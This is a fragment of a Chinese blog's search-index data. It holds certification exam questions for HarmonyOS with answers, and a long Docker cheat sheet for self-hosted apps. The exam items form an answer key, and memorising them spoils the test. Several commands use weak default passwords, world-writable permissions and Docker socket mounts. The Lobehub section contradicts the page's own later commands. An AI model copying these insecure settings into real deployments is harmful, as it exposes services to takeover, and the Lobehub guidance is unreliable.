代码格式化功能可以帮助您快速的调整和规范代码格式，提升代码的美观度和可读性 D. 如果输入的语法不符合编码规范，或者出现语义语法错误，编辑器会显示错误或警告\nc3\nlet const\nlet stu:Array =[\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;]; let stus:string [] = [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;];\nenum Color{ Red, Blue }\nlet fvColor:Color= Color.Red;\n","permalink":"https://qfsyso.github.io/posts/harmonyos%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%88%9D%E7%BA%A7%E8%AE%A4%E8%AF%81%E9%A2%98%E7%9B%AE2024.11%E6%96%B0%E7%89%88%E9%A2%98%E7%9B%AE%E7%AD%94%E6%A1%88/","summary":"HarmonyOS应用开发者认证题目(2024.11新版，题目\u0026amp;答案)\nc1 about\n判断题\n1.“一次开发，多端部署”指的是一个工程，一次开发上架，多端按需部署。为了实现这一目的，HarmonyOS提供了多端开发环境，多端开发能力以及多端分发机制。\n正确(True)\n2.《鸿蒙生态应用开发白皮书》全面阐释了鸿蒙生态下应用开发核心理念、关键能力以及创新体验，旨在帮助开发者快速、准确、全面的了解鸿蒙开发套件给开发者提供的能力全景和未来的愿景。\n正确(True)\n3.HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力。\n正确(True)\n单选题\n1.当用户希望能够在多个设备间来回切换、完成多个任务，开发者可以使用以下哪个核心能力，以便应用不间断地给用户提供服务的能力。\nC. 自由流转\n2.当您希望获取到最全面、最详细的功能描述、参数说明和权限信息时，应该从（）寻找？\nC. API参考\n3.应用如需在多个设备上运行，需要适配不同的屏幕尺寸和分辨率、不同的交互方式（如触摸和键盘等）、不同的硬件能力（如内存差异和器件差异等），开发成本较高。“一次开发，多端部署”提供了哪个核心能力降低了多设备应用的开发成本？\nB. 多端开发能力\n4.如果开发者在原生应用版本的基础上，想要提供多种服务给用户，开发者选择开发场景的最优选是？\nB. 开发多个元服务，按需组合为一个复杂的应用\n多选题\n1.下列哪些选项属于HarmonyOS三大技术理念。\nA. 一次开发，多端部署 B. 可分可合，自由流转 C. 统一生态，原生智能\n2.用户使用应用的情境发生变化时（例如从室内走到户外、从办公室到车上等），之前使用的设备可能已经不适合继续当前的任务，或者周围有更合适的设备，此时，可以选择使用新的设备来继续当前的任务。以下哪些场景适合使用跨端迁移能力？\nA. 在外时手机上编辑邮件，到公司后在2in1设备上继续编辑 B. 在外时手机玩游戏，到家后希望获取更好的视觉体验，在平板上继续玩 C. 在家里智慧屏上看视频，当下需要出门时，可以手机上继续观看 D. 手机视频通话中，到家后家中有智慧屏，可以更沉浸地视频聊天\n3.下列哪些说法是正确的。\nA. HUAWEI DevEco Studio 提供了设备模拟的能力，解决HarmonyOS生态应用、元服务开发过程中遇到的真机设备不足、无分布式应用调试环境等问题，为开发者提供低成本、易获取的调测验证环境 B. 为了降低性能调优技术难度，HUAWEI DevEco Studio推出了场景化调优工具 DevEco Profiler C. HUAWEI DevEco Studio提供了一系列命令行工具，辅助开发者更高效的管理 SDK 、设备，提升调试、调优的效率 D. HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力\nc2 DevEco Studio\n判断题\n1.如果代码中涉及到一些网络、数据库、传感器等功能的开发，均可使用预览器进行预览。\n错误(False)","title":"HarmonyOS应用开发者初级认证题目(2024.11新版，题目\u0026答案)"},{"content":"docker 运行有趣的项目\nUptime Kuma 简单实用, 主要用来监控 Web 和网络 https://github.com/louislam/uptime-kuma\ndocker run -d --restart=always -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1 Portainer - 容器管理面板 Portainer 提供了一个简单易用的 Web 界面来管理和监控 Docker 容器、镜像、网络等。你可以通过下面的命令快速启动它：\ndocker volume create portainer_data docker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce lobechat \u0026lt;在Linux环境下，如何使用Docker部署Lobehub？\n在Linux环境下使用Docker部署Lobehub（一个开源的低代码开发平台）涉及几个步骤。 Lobehub 官方并未提供一个直接的Docker镜像，但你可以通过以下步骤来手动创建并运行一个Docker容器，以使用Lobehub。\n步骤 1: 安装Docker 确保你的Linux系统上已安装Docker。你可以通过运行以下命令来安装Docker：\n# 对于基于Debian的系统（如Ubuntu） sudo apt-get update sudo apt-get install docker.io # 对于基于RHEL的系统（如CentOS） sudo yum install docker # 启动Docker服务 sudo systemctl start docker sudo systemctl enable docker 步骤 2: 拉取Node.js和Nginx的基础镜像 由于Lobehub是基于Node.js的，你需要一个Node.js环境。你可以使用官方的Node.js镜像。同时，为了更好的生产环境支持，你可能还想使用Nginx作为反向代理。\ndocker pull node:14 # 使用LTS版本的Node.js docker pull nginx:latest ## 步骤 3: 创建Dockerfile 在你的Lobehub项目目录中，创建一个Dockerfile来定义如何构建你的应用容器。这里是一个基本的示例： # 使用Node.js基础镜像 FROM node:14 # 设置工作目录 WORKDIR /usr/src/app # 复制项目文件到工作目录 COPY . . # 安装依赖 RUN npm install # 暴露端口（默认是3000） EXPOSE 3000 # 启动应用 CMD [\u0026#34;npm\u0026#34;, \u0026#34;start\u0026#34;] 步骤 4: 构建Docker镜像 在包含Dockerfile的目录中，运行以下命令来构建你的Docker镜像：\ndocker build -t lobehub . 步骤 5: 运行Nginx容器和Lobehub容器 首先，运行Nginx容器以提供反向代理服务：\ndocker run -d --name nginx -p 80:80 -v /path/to/nginx.conf:/etc/nginx/nginx.conf:ro nginx 然后，运行Lobehub容器：\ndocker run -d --name lobehub -p 3000:3000 lobehub 步骤 6: 配置Nginx（如果需要） 如果你需要配置Nginx来代理到Lobehub容器，你需要创建一个Nginx配置文件，例如：\nserver { listen 80; server_name yourdomain.com; # 替换为你的域名或IP地址和端口号（例如 localhost） location / { proxy_pass http://localhost:3000; # Lobehub运行端口 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } 确保将此配置文件挂载到Nginx容器中，并重新启动Nginx容器。\n步骤 7: 访问Lobehub 在浏览器中访问你的服务器地址（例如 http://yourdomain.com 或 http://localhost），你应该能看到Lobehub正在运行。\n以上步骤应该可以帮助你在Linux环境下使用Docker部署Lobehub。如果Lobehub有官方的Docker镜像或更简便的部署方法，建议查看最新的官方文档或社区资源以获取更直接的部署方式。\nor\nhttps://www.cnblogs.com/hoyeong/p/18793046\nJenkins - 持续集成服务器 Jenkins 是一个流行的开源持续集成工具，用于自动化构建、测试和部署过程。可以通过以下命令启动 Jenkins：\ndocker run -u root --rm -d -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts docker logs \u0026lt;containerId\u0026gt; 管理密码 登录 https://www.jenkins.io/doc/book/system-administration/viewing-logs/\nGitea - 自托管的 Git 服务 Gitea 是一个轻量级的代码托管平台，适合个人或小团队使用。使用 Docker 运行 Gitea 非常简单：\ndocker run -d --name gitea -p 10022:22 -p 10080:3000 -v /path/to/gitea:/data gitea/gitea:latest Nextcloud - 自建云盘 Nextcloud 是一个功能强大的自托管文件同步与分享解决方案，支持多种设备访问。启动 Nextcloud 的命令如下：\ndocker run -d --name nextcloud -p 8080:80 -v /path/to/nextcloud-data:/var/www/html nextcloud 设定管理密码 即可使用\nDocker Compose 安装Docker Compose sudo apt install -y docker-compose-plugin 将当前用户添加到docker组（避免每次使用sudo） sudo usermod -aG docker $USER newgrp docker 创建Nextcloud部署目录 mkdir -p ~/nextcloud/{data,db,apps,config} 创建docker-compose.yml文件 cat \u0026laquo;EOF \u0026gt; ~/nextcloud/docker-compose.yml version: \u0026lsquo;3\u0026rsquo; services: db: image: mariadb:10.6 restart: always command: \u0026ndash;transaction-isolation=READ-COMMITTED \u0026ndash;binlog-format=ROW volumes: - ./db:/var/lib/mysql environment: - MYSQL_ROOT_PASSWORD=nextcloud_root_password - MYSQL_PASSWORD=nextcloud_db_password - MYSQL_DATABASE=nextcloud - MYSQL_USER=nextcloud\napp: image: nextcloud:latest restart: always ports: - 8080:80 volumes: - ./data:/var/www/html/data - ./config:/var/www/html/config - ./apps:/var/www/html/apps depends_on: - db EOF 4. 启动Nextcloud容器\ncd ~/nextcloud docker compose up -d 访问Nextcloud 在浏览器中访问：http://你的服务器IP:8080 首次访问时，Nextcloud会引导你完成初始设置：\n创建管理员账户 配置数据库连接： 数据库用户：nextcloud 数据库密码：nextcloud_db_password（与docker-compose.yml中设置的一致） 数据库名称：nextcloud 数据库主机：db 可选 - 用Nginx作为反向代理\nPi-hole - 广告拦截DNS服务器 Pi-hole 可以帮助你拦截广告、跟踪器和其他不需要的内容，为网络浏览体验提供更好的保护。安装和运行 Pi-hole 很简单：\ndocker run -d --name pihole --cap-add=NET_ADMIN --dns=127.0.0.1 --dns=8.8.8.8 -e TZ=Asia/Shanghai -p 53:53/tcp -p 53:53/udp -p 80:80 -p 443:443 -v \u0026#34;$(pwd)\u0026#34;/pihole:/etc/pihole -v \u0026#34;$(pwd)\u0026#34;/dnsmasq.d:/etc/dnsmasq.d pihole/pihole Ghost - 博客平台 Ghost 是一个现代化的开源博客平台，专为出版而设计。运行 Ghost 的 Docker 容器只需要一行命令：\ndocker run -d --name some-ghost -p 2368:2368 ghost Nginx - 高性能的 Web 和反向代理服务器 Nginx 是一个非常流行和高效的 Web 服务器，适用于静态网站或作为反向代理服务器。启动 Nginx 非常简单：\ndocker run -d --name my-nginx -p 80:80 nginx WordPress - 开源博客平台和 CMS WordPress 是世界上最受欢迎的博客平台之一，也可以用作内容管理系统 (CMS)。启动 WordPress 需要同时运行 MySQL 数据库：\n# 启动 MySQL 数据库 docker run -d --name mysql-wordpress -e MYSQL_ROOT_PASSWORD=my-secret-pw -e MYSQL_DATABASE=wordpress -e MYSQL_USER=wordpress -e MYSQL_PASSWORD=my-secret-pw mysql:5.7 # 启动 WordPress docker run -d --name wordpress --link mysql-wordpress:mysql -p 8080:80 -e WORDPRESS_DB_HOST=mysql-wordpress:3306 -e WORDPRESS_DB_USER=wordpress -e WORDPRESS_DB_PASSWORD=my-secret-pw -e WORDPRESS_DB_NAME=wordpress wordpress PostgreSQL - 强大的开源对象关系型数据库系统 PostgreSQL 是一个非常强大且可靠的数据库系统。启动 PostgreSQL 非常简单：\ndocker run -d --name my-postgres -e POSTGRES_PASSWORD=mysecretpassword -p 5432:5432 postgres MongoDB - 文档型 NoSQL 数据库 MongoDB 是一个基于分布式文件存储的数据库，适用于大数据处理。启动 MongoDB：\ndocker run -d --name my-mongo -p 27017:27017 mongo Redis - 高性能键值存储系统 Redis 是一个高性能的键值数据库，常用于缓存和消息队列。启动 Redis：\ndocker run -d --name my-redis -p 6379:6379 redis MinIO - 高性能的对象存储系统 MinIO 是一个高性能的对象存储系统，兼容 Amazon S3 API。非常适合用来搭建私有云存储服务。启动 MinIO：\ndocker run -d --name minio1 -p 9000:9000 -p 9001:9001 -e \u0026#34;MINIO_ROOT_USER=minioadmin\u0026#34; -e \u0026#34;MINIO_ROOT_PASSWORD=minioadmin\u0026#34; minio/minio server /data --console-address \u0026#34;:9001\u0026#34; Traefik - 现代的 HTTP 反向代理和负载均衡器 Traefik 是一个现代的 HTTP 反向代理和负载均衡器，支持自动发现后端服务。启动 Traefik：\ndocker run -d --name traefik -p 8080:8080 -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -v $PWD/traefik.yml:/etc/traefik/traefik.yml traefik:v2.5 注意：需要创建一个 traefik.yml 配置文件来指定 Traefik 的行为。\nNetData - 实时性能监控工具 NetData 是一个实时性能监控工具，可以监控服务器的各种指标。启动 NetData：\ndocker run -d --name netdata -p 19999:19999 -v /host/proc:/host/proc:ro -v /etc/os-release:/host/etc/os-release:ro -v /sys:/host/sys:ro -v /etc/passwd:/host/etc/passwd:ro -v /etc/group:/host/etc/group:ro -v /etc/machine-id:/host/etc/machine-id:ro -v /var/lib/netdata:/netdata -v /etc/netdata:/etc/netdata -v /run/docker.sock:/var/run/docker.sock -e NETDATA_CLAIM_TOKEN=my-token -e NETDATA_CLAIM_URL=https://app.netdata.cloud -e NETDATA_CLAIM_ID=my-machine-id netdata/netdata 这些项目不仅功能强大，而且非常容易通过 Docker 快速启动和运行。\n开发环境 Golang - Go 语言开发环境 Go 是一种静态类型的编译语言，适合构建高效的服务和应用程序。启动一个 Go 语言的开发环境：\ndocker run -it --name go-lang golang:latest Node.js - JavaScript 运行时环境 Node.js 允许你在服务器端运行 JavaScript 代码。启动一个 Node.js 环境：\ndocker run -it --name node-app node:latest Python - 多用途编程语言 Python 是一种广泛使用的高级编程语言，适用于各种应用场景。启动一个 Python 环境：\ndocker run -it --name python-env python:latest Flask - 轻量级 Web 应用框架 Flask 是一个用 Python 编写的轻量级 Web 应用框架。启动一个简单的 Flask 应用：\ndocker run -d --name flask-app -p 5000:5000 tiangolo/uwsgi-nginx-flask:python3.7 Django - 高级 Web 框架 Django 是一个高级的 Python Web 框架，鼓励快速开发和干净、实用的设计。启动一个 Django 应用：\ndocker run -d --name django-app -p 8000:8000 python:3.9-slim bash -c \u0026#34;pip install django \u0026amp;\u0026amp; django-admin startproject myproject \u0026amp;\u0026amp; cd myproject \u0026amp;\u0026amp; python manage.py runserver 0.0.0.0:8000\u0026#34; React - 前端 JavaScript 库 React 是一个用于构建用户界面的 JavaScript 库。启动一个 React 开发环境：\ndocker run -it --name react-app -p 3000:3000 node:14 bash # 在容器内执行以下命令 npm init react-app my-app cd my-app npm start Vue.js - 前端 JavaScript 框架 Vue.js 是一个用于构建用户界面的渐进式框架。启动一个 Vue.js 开发环境： docker run -it --name vue-app -p 8080:8080 node:14 bash # 在容器内执行以下命令 npm install -g @vue/cli vue create my-app cd my-app npm run serve Gatsby - 静态站点生成器 Gatsby 是一个基于 React 的静态站点生成器，适合构建静态网站和博客。启动一个 Gatsby 开发环境： docker run -it --name gatsby-app -p 8000:8000 node:14 bash # 在容器内执行以下命令 npm install -g gatsby-cli gatsby new my-site cd my-site gatsby develop Portainer Portainer 是一款轻量级的 Docker 可视化管理工具，支持容器、镜像、网络、卷等全功能管理。\n单节点部署命令：\n# 创建数据卷用于持久化数据 docker volume create portainer_data # 启动Portainer容器 docker run -d \\ -p 8000:8000 \\ -p 9443:9443 \\ --name portainer \\ --restart=always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v portainer_data:/data \\ portainer/portainer-ce:latest docker ui docker run -d \\ --name docker.ui \\ --restart always \\ -p 8999:8999 \\ -v /var/run/docker.sock:/var/run/docker.sock \\ joinsunsoft/docker.ui docker chromium docker pull registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest docker run -d --name=chromium -p 3000:3000 -v ./data:/config registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest Optional environment variables Variable Description CUSTOM_PORT Internal port the container listens on for http if it needs to be swapped from the default 3000. CUSTOM_HTTPS_PORT Internal port the container listens on for https if it needs to be swapped from the default 3001. CUSTOM_USER HTTP Basic auth username, abc is default. PASSWORD HTTP Basic auth password, abc is default. If unset there will be no auth SUBFOLDER Subfolder for the application if running a subfolder reverse proxy, need both slashes IE /subfolder/ TITLE The page title displayed on the web browser, default \u0026ldquo;KasmVNC Client\u0026rdquo;. FM_HOME This is the home directory (landing) for the file manager, default \u0026ldquo;/config\u0026rdquo;. START_DOCKER If set to false a container with privilege will not automatically start the DinD Docker setup. DRINODE If mounting in /dev/dri for DRI3 GPU Acceleration allows you to specify the device to use IE /dev/dri/renderD128 LC_ALL Set the Language for the container to run as IE fr_FR.UTF-8 ar_AE.UTF-8 NO_DECOR If set the application will run without window borders for use as a PWA. NO_FULL Do not autmatically fullscreen applications when using openbox. REMOTE_DEBUGGING 是否开启远程调试。 默认是 false ，可选值： true 或 false HEADLESS 是否开启无头模式。 默认是 false ，可选值： true 或 false openbox.\nNext.js - React 框架的全栈解决方案 Next.js 是一个用于构建服务器渲染的 React 应用程序的框架。启动一个 Next.js 开发环境：\ndocker run -it --name next-app -p 3000:3000 node:14 bash # 在容器内执行以下命令 npx create-next-app my-app cd my-app npm run dev drawio 这是一个高人气的免费在线图表软件，用于创建流程图、UML 图、架构图等。支持多种文件格式，并且可以与 Google Drive、OneDrive 等云存储服务集成，支持实时协作编辑功能。在线使用地址：https://app.diagrams.net/\ndocker run -it --rm --name=\u0026#34;draw\u0026#34; -p 8080:8080 -p 8443:8443 jgraph/drawio easyimage 一个简单的图床程序，功能简单，无需数据库。\ndocker run -itd --name easyimage -p 8080:80 -e TZ=Asia/Shanghai -e PUID=1000 -e PGID=1000 -e DEBUG=false -v /share/Data/easyimage/config:/app/web/config -v /share/Data/easyimage/i:/app/web/i ddsderek/easyimage:latest Neko 这是一个在 Docker 中运行并使用 WebRTC 技术的自托管虚拟浏览器。Neko 是一个功能强大的工具，允许您在虚拟环境中运行功能齐全的浏览器，使您能够从任何地方安全、私密地访问互联网。借助 Neko，您可以像在常规浏览器上一样浏览网页、运行应用程序并执行其他任务，所有这些都在安全且隔离的环境中进行。无论您是想要测试 Web 应用程序的开发人员、寻求安全浏览体验的注重隐私的用户，还是只是想要利用虚拟浏览器的便利性和灵活性的人，Neko 是完美的解决方案。\ndocker run -d \\ --restart always \\ --name neko \\ --shm-size=\u0026#34;2gb\u0026#34; \\ -p 8080:8080 \\ -p 52000-52100:52000-52100/udp \\ -e NEKO_PASSWORD=\u0026#39;neko\u0026#39; \\ -e NEKO_PASSWORD_ADMIN=\u0026#39;admin\u0026#39; \\ -e NEKO_NAT1TO1=43.156.38.52 \\ -e NEKO_SCREEN=1920x1080@30 \\ -e NEKO_ICELITE=1 \\ -e NEKO_EPR=52000-52100 \\ m1k1o/neko:latest speedtest-x 网速测试\ndocker run -d --name speedtest-x --restart always -p 9001:80 -it badapple9/speedtest-x myspeed 网速测试 docker run -d \\ --restart always \\ --name myspeed \\ -p 8080:5216 \\ -v /data/myspeed/data:/myspeed/data \\ germannewsmaker/myspeed SurveyKing调查问卷系统和考试系统 docker run -d --name SurveyKing --restart always -p 8080:1991 surveyking/surveyking admin 123456 驾考考试/问卷\nEnBizCard 基于 HTML 的交互式和响应式数字名片。\ndocker run -d \\ --restart unless-stopped \\ --name enbizcard \\ -p 5600:80 \\ swr.cn-north-4.myhuaweicloud.com/jeven/enbizcard SyncTV 一起看视频\ndocker run -d --name synctv -p 8080:8080 synctvorg/synctv docker run -d \\ \\ --name briefing \\ -v /datar/briefing/data:/app/data \\ -p 8080:8080 \\ --restart always \\ holtwick/briefing go-file 图床 mkdir -p /data/go-file/data chmod -R 777 /data/go-file/ docker run -d --restart always -p 8080:3000 -e TZ=Asia/Shanghai -v /data/go-file/data:/data justsong/go-file Adminer 轻量级的 MySQL 管理工具 docker run --name adminer -d -p 8080:8080 adminer chromium https://github.com/Soneji/docker-chromium\n-e KEEP_APP_RUNNING=1 \\ ##关闭了之后会自动重启，不然所有标签页关闭了，浏览器也就关了。 -e ENABLE_CJK_FONT=1 \\ ##一定要加这个，不然中文显示乱码 -e SECURE_CONNECTION=1 \\ ##启用 HTTPS，再绑定域名，安全一点点，不建议开启，开启后，初始化很慢 -e VNC_PASSWORD=xxxxxxxx \\ ##访问密码，不然谁打开都能用了\ndocker run -d \\ --name=chromium1 \\ -e KEEP_APP_RUNNING=1 \\ -e ENABLE_CJK_FONT=1 \\ -e VNC_PASSWORD=adminm \\ -p 12800:5800 \\ -v /docker/appdata/chromium:/config:rw \\ --shm-size 2g \\ overclockedllama/docker-chromium mssql docker run -e \u0026#34;ACCEPT_EULA=Y\u0026#34; -e \u0026#34;SA_PASSWORD=Aa123123..\u0026#34; \\ -p 1433:1433 --name sqlserver \\ -d mcr.microsoft.com/mssql/server:2022-latest firefox mkdir -p /data/firefox/config\ndocker run -d --name firefox -e TZ=Asia/Hong_Kong -e DISPLAY_WIDTH=1920 -e DISPLAY_HEIGHT=1080 -e KEEP_APP_RUNNING=1 -e ENABLE_CJK_FONT=1 -e VNC_PASSWORD=admin -p 5800:5800 -p 5900:5900 -v /data/firefox/config:/config:rw --shm-size 2g jlesage/firefox #参数介绍 -e TZ=Asia/Hong_Kong # 设置时区 -e DISPLAY_WIDTH=1920 -e DISPLAY_HEIGHT=1080 #设置显示的高宽 -e KEEP_APP_RUNNING=1 # 保持启动状态 -e ENABLE_CJK_FONT=1 # 防止显示页面时中文乱码 -e SECURE_CONNECTION=1 # 启用HTTPS功能 -e VNC_PASSWORD=admin #设置VNC的访问密码,自定义即可 -p 5800:5800 #访问firefox的web端口 -p 5900:5900 #VNC端口 -v /data/irefox/config:/config:rw # 容器挂载目录，存放firefox数据 \u0026ndash;shm-size 2g # 设置容器的内存资源为2g\nopenvscode-server github.com/gitpod-io/openvscode-server\ndocker run -d --name openvscode-server \\ -p 3000:3000 \\ -v /path/to/project:/home/workspace/project \\ -e USERNAME=user \\ -e PASSWORD=pass \\ gitpod/openvscode-server Palworld Dedicated Server docker run -d \\ -p 8211:8211/udp -p 27015:27015/udp \\ -v palworld:/palworld \\ jammsen/palworld-dedicated-server DeepSeek-R1 7b + Open-WebUI ### 拉起大模型 docker run -d -p 11434:11434 --name ollama ollama/ollama docker exec -it ollama ollama run deepseek-r1:7b ### 拉起聊天 UI docker run -d -p 8080:8080 \\ -e OLLAMA_BASE_URL=http://host.docker.internal:11434 \\ ghcr.io/open-webui/open-webui:main llama3 lbchat docker run -d --name ollama -p 11434:11434 ollama/ollama:latest \u0026amp;\u0026amp; \\ docker run -d --name lobechat -p 3210:3210 \\ -e ACCESS_CODE=lobe66 \\ -e OLLAMA_PROXY_URL=http://host.docker.internal:11434 \\ lobehub/lobe-chat:latest \u0026amp;\u0026amp; \\ docker exec ollama ollama pull llama3:8b hoppscotch pm 33000 git clone https://github.com/hoppscotch/hoppscotch.git cd hoppscotch # .env docker compose --profile default-no-db up https://github.com/hoppscotch/hoppscotch\ncode-ser https://github.com/coder/code-server\ndocker run -d \\ --name code-server11 \\ -p 1180:8080 \\ -e PASSWORD=\u0026#34;admin111\u0026#34; \\ -v ~/code-server-data:/home/coder/project \\ codercom/code-server:latest 可选：使用 docker-compose（更方便管理）\nversion: \u0026#39;3\u0026#39; services: code-server: image: codercom/code-server:latest container_name: code-server ports: - \u0026#34;8080:8080\u0026#34; environment: - PASSWORD=your_password_here volumes: - ./code-server-data:/home/coder/project restart: always 然后运行：\ndocker-compose up -d Docker Compose 使用 Docker Compose 来启动一个包含 Nginx 和 PHP-FPM 的 WordPress 环境。\n步骤 1: 安装 Docker 和 Docker Compose 首先，确保你已经在机器上安装了 Docker 和 Docker Compose。\n安装 Docker 打开终端或命令提示符。 根据操作系统，按照官方文档安装 Docker： Ubuntu:\nsudo apt-get update sudo apt-get install docker.io MacOS: 下载并安装 Docker Desktop for Mac Windows: 下载并安装 Docker Desktop for Windows 安装 Docker Compose 在终端或命令提示符中运行以下命令：\nsudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version 步骤 2: 创建项目目录 创建一个新的目录来存放项目文件：\nmkdir wordpress-project cd wordpress-project 步骤 3: 创建 docker-compose.yml 文件 使用你喜欢的文本编辑器（如 nano 或 vim）创建 docker-compose.yml 文件：\nnano docker-compose.yml 将以下内容复制并粘贴到 docker-compose.yml 文件中： version: \u0026#39;3\u0026#39; services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - \u0026#34;8000:80\u0026#34; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: db_data: 保存并关闭文件。\n步骤 4: 启动 Docker Compose 在终端或命令提示符中，导航到项目目录：\ncd wordpress-project 运行以下命令启动 Docker Compose： docker-compose up -d -d 参数表示在后台运行容器。\n步骤 5: 访问 WordPress 打开浏览器，访问 http://localhost:8000。 看到 WordPress 的安装页面。按照提示完成安装过程。\n步骤 6: 停止和删除容器 如果你需要停止和删除所有容器，可以运行以下命令：\ndocker-compose down version: \u0026lsquo;3\u0026rsquo;: 指定 Docker Compose 文件的版本。 services: 定义了多个服务，每个服务对应一个容器。 db: 定义了一个 MySQL 数据库服务。 image: mysql:5.7: 使用 MySQL 5.7 镜像。 volumes: 将主机上的 db_data 卷挂载到容器的 /var/lib/mysql 目录。 environment: 设置环境变量，如数据库密码和用户名。 wordpress: 定义了一个 WordPress 服务。 depends_on: 指定该服务依赖于 db 服务。 image: wordpress:latest: 使用最新版本的 WordPress 镜像。 ports: 将主机的 8000 端口映射到容器的 80 端口。 environment: 设置环境变量，如数据库主机地址和用户名。 volumes: 定义了数据卷，用于持久化数据。\nawesome_docker_cn https://github.com/coracoo/awesome_docker_cn\ndocker compose # 下载最新版本的Docker Compose sudo curl -L \u0026#34;https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose # 赋予执行权限 sudo chmod +x /usr/local/bin/docker-compose # 创建软链接（适用于某些Linux系统） sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose docker run bak Uptime Kuma 31001 docker run -d \\ --restart=always \\ -p 31001:3001 \\ -v uptime-kuma:/app/data \\ --name uptime-kuma \\ louislam/uptime-kuma:latest novel 30000 docker run -p 30000:30000 --name ideaflow1-novel-download \\ -v /Users/download:/app/download \\ -v /Users/novel-download/db:/app/db \\ -d --platform linux/arm64/v8 ideaflow1/novel-download:1.0.0 x86_64 \u0026ndash;platform linux/arm64/v8\nreader 380 docker run -d --restart=always \\ -d --name koodo-reader \\ -p 380:80 \\ -p 38180:8080 \\ -e ENABLE_HTTP_SERVER=false \\ -e SERVER_USERNAME=admin \\ -e SERVER_PASSWORD=123123 \\ -v /path/to/host/uploads:/app/uploads \\ ghcr.io/koodo-reader/koodo-reader:master nextcloud 49001 # 1. 建持久化目录（随意改） sudo mkdir -p /srv/nextcloud # 2. 启动容器 docker run -d --name nextcloud \\ -p 49001:80 \\ -v /srv/nextcloud:/var/www/html \\ --restart unless-stopped \\ nextcloud https://github.com/nextcloud/android/releases\nLibreTV 48899 docker run -d \\ --name libretv \\ --restart unless-stopped \\ -p 48899:8080 \\ -e PASSWORD=123123 \\ bestzwei/libretv:latest lobe-chat 33210 docker run -d --name lobechat -p 33210:3210 \\ -e ACCESS_CODE=lobe66 \\ -e OLLAMA_PROXY_URL=http://host.docker.internal:11434 \\ lobehub/lobe-chat:latest lan-clipboard 34510 docker build -t lan-clipboard . docker run -d --restart=always \\ -d --name lan-clipboard -p 34510:34510 \\ -v $PWD/uploads:/app/uploads \\ -v $PWD/data:/app/data \\ lan-clipboard gotify push 8385 docker run -d \\ --name gotify \\ --restart unless-stopped \\ -p 8385:80 \\ -v \u0026#34;$PWD/gotify_data\u0026#34;:/app/data \\ -e GOTIFY_DEFAULTUSER_NAME=admin \\ -e GOTIFY_DEFAULTUSER_PASS=123123 \\ gotify/server:2.2.2 首页，点击 app，然后新建一个 APP，记好 token\nhttps://github.com/gotify/android/releases curl \u0026ldquo;https://192.168.80.40:8385/message?token=CgwhLcjxGQxxx\u0026rdquo; -F \u0026ldquo;title=my title\u0026rdquo; -F \u0026ldquo;message=my message\u0026rdquo; -F \u0026ldquo;priority=5\u0026rdquo;\nmystt 51000 cd stt docker build -t stt-app . docker run -p 51000:5000 \\ -v /opt/stt:/opt/stt \\ stt-app OpenWebUI 13031 docker run -d \\ --name openwebui \\ -p 13031:8080 \\ -e OLLAMA_API_BASE_URL=http://\u0026lt;ollamaIP\u0026gt;:11434 \\ -v openwebui-data:/app/backend/data \\ ghcr.io/open-webui/open-webui:latest pansou 51880 docker run -d --name pansou -p 51880:80 ghcr.io/fish2018/pansou-web moontv 13130 docker run -d --name moontv -p 13130:3000 -e PASSWORD=Aa123123 ghcr.io/senshinya/moontv:latest how-to-cook 15508 docker pull ghcr.io/anduin2017/how-to-cook:latest docker run -d -p 15508:80 --restart unless-stopped ghcr.io/anduin2017/how-to-cook:latest pdf 31080 docker run -d \\ --name stirling-pdf \\ -p 31080:8080 \\ -v $(pwd)/stirling-pdf-data:/usr/share/tomcat/webapps/stirling-data \\ frooodle/s-pdf:latest drawio 40180 docker run -d \\ --name drawio \\ -p 40180:8080 \\ -e TZ=Asia/Shanghai \\ --restart unless-stopped \\ jgraph/drawio:latest memos 笔记工具 docker run -d \\ --name memos \\ --publish 5230:5230 \\ --volume ~/.memos/:/var/opt/memos \\ neosmemo/memos:stable code server docker run -d \\ --name=code-server \\ -p 48143:8443 \\ -e PUID=1000 \\ -e PGID=1000 \\ -e TZ=Etc/UTC \\ -e PASSWORD=\u0026#34;Aa123123\u0026#34; \\ -v /path/to/your/config:/config \\ -v /path/to/your/projects:/config/workspace \\ --restart unless-stopped \\ lscr.io/linuxserver/code-server:latest dbeaver web db 38978 docker run -d \\ --name cloudbeaver \\ -p 38978:8978 \\ dbeaver/cloudbeaver:latest qinglong 15707 docker run -dit \\ --name qinglong \\ --hostname qinglong \\ -p 35707:5700 \\ -v $PWD/ql/config:/ql/config \\ -v $PWD/ql/log:/ql/log \\ -v $PWD/ql/db:/ql/db \\ -v $PWD/ql/scripts:/ql/scripts \\ -v $PWD/ql/repo:/ql/repo \\ -v 